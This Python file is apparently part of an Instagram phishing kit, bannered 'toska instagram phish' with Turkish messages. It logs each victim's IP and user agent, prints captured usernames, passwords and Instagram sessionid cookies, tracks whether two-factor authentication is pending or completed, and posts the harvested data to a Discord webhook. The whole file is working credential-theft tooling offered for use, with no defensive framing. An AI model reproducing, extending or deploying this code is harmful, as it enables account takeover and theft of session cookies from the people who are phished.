import json
from colorama import Fore, Style
import requests
from dotenv import load_dotenv
import os

# ANSI renk kodları
CYAN = "\033[96m"
PURPLE = "\033[95m"
MAGENTA = "\033[35m"
RED = "\033[91m"
DARK_GRAY = "\033[90m"
RESET = "\033[0m"

def banner1():
    banner = f"""
{CYAN}╔════════════════════════════════════════════════════════════╗{RESET}
{CYAN}║                                                            ║{RESET}
{PURPLE}║      ████████╗ ██████╗ ███████╗██╗  ██╗ █████╗  ██████╗     ║{RESET}
{PURPLE}║      ╚══██╔══╝██╔═══██╗██╔════╝██║  ██║██╔══██╗██╔═══██╗    ║{RESET}
{MAGENTA}║         ██║   ██║   ██║███████╗███████║███████║██║   ██║    ║{RESET}
{MAGENTA}║         ██║   ██║   ██║╚════██║██╔══██║██╔══██║██║   ██║    ║{RESET}
{RED}║         ██║   ╚██████╔╝███████║██║  ██║██║  ██║╚██████╔╝     ║{RESET}
{RED}║         ╚═╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝     ║{RESET}
{CYAN}║                                                            ║{RESET}
{CYAN}║             toska instagram phish  hoş geldin              ║{RESET}
{CYAN}║                                                            ║{RESET}
{CYAN}╚════════════════════════════════════════════════════════════╝{RESET}

"""
    print(banner)


load_dotenv()
DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL')

def send_webhook_message( message):
    webhook_url = DISCORD_WEBHOOK_URL
    if webhook_url=="":
        return "Webhook url is empty"
    data = {
        "content": "```\n" + message + "```"
    }
    headers = {
        'Content-Type': 'application/json',
    }
    try:
        response = requests.post(webhook_url, data=json.dumps(data), headers=headers)
        response.raise_for_status()
        print(f"\n{Fore.GREEN}Message sent to Discord.{Style.RESET_ALL}")
    except requests.exceptions.RequestException as e:
        print(f"\n{Fore.RED}Error sending message to Discord: {e}{Style.RESET_ALL}")


def capture_information(filename, n):
    with open(filename, 'r') as f:
        lines = f.readlines()
    last_lines = lines[-n:]
    filtered_lines =  [line for line in last_lines if line.strip()]
    filtered_lines_str = ""
    for line in filtered_lines:
        if "Username" in line:
            filtered_lines_str += "--------------------------------------\n"
        filtered_lines_str += line 
    filtered_lines_str += "--------------------------------------"
    return filtered_lines_str


def edit_cookies(cookies):
    cookies = json.loads(cookies)
    new_cookies =  f"\nsessionid:  {cookies['sessionid']}"
    return new_cookies


def first_art(visit_time, user_ip, user_agent):
    user_agent = user_agent
    message = f"""{Style.BRIGHT}{Fore.YELLOW}
   ------- Hedef tespit edildi!! BY @toskaorj---
 --------------------------------------------
|Enter website in: {Fore.GREEN}{visit_time}                                               
{Fore.YELLOW} --------------------------------------------
|IP:~~~~~~~~~~~~~~ {Fore.GREEN}{user_ip}                                                              
{Fore.YELLOW} --------------------------------------------
|User-Agent:~~~~~~ {Fore.GREEN}{user_agent}
{Fore.YELLOW}---------------------------------------------"""
    print(message)


def correct_all(username,password,cookies):
    cookies = cookies.strip().split()
    message = f"""{Style.BRIGHT}{Fore.GREEN}
          ------Başarılı giriş BY @toskaorj---
{Fore.YELLOW} --------------------------------------------
| Username:   {Fore.GREEN}{username}                                               
{Fore.YELLOW} --------------------------------------------
| Password:   {Fore.GREEN}{password}                                                              
{Fore.YELLOW} --------------------------------------------
| sessionid:  {Fore.GREEN}{cookies[1]}
{Fore.YELLOW}---------------------------------------------"""
    print(message)


def wrong_answer(username,password):
    message = f"""{Style.BRIGHT}{Fore.RED}
     ----Kullanıcı adı veya Şifre yanlış BY @toskaorj---
{Fore.YELLOW} --------------------------------------------
| Username:   {Fore.RED}{username}                                               
{Fore.YELLOW} --------------------------------------------
| Password:   {Fore.RED}{password}                                                              
{Fore.YELLOW} --------------------------------------------"""
    print(message)


def twoFA_active(username,password):
    message = f"""{Style.BRIGHT}{Fore.YELLOW}
------Kullanıcı adı ve şifre doğru ancak iki faktörlü kimlik doğrulama (2FA) aktif. BY @toskaorj---
{Fore.YELLOW} --------------------------------------------
| Username:   {Fore.GREEN}{username}                                               
{Fore.YELLOW} --------------------------------------------
| Password:   {Fore.GREEN}{password}                                                              
{Fore.YELLOW} --------------------------------------------

        İki faktörlü doğrulama bekleniyor...
"""
    print(message)

def twoFA_correct(cookies):
    cookies = cookies.strip().split()
    message = f"""{Style.BRIGHT}{Fore.GREEN}
        İki faktörlü doğrulama tamamlandı.
{Fore.YELLOW} --------------------------------------------
| Sessionid:   {Fore.GREEN}{cookies[1]}                                               
{Fore.YELLOW} --------------------------------------------"""
    print(message)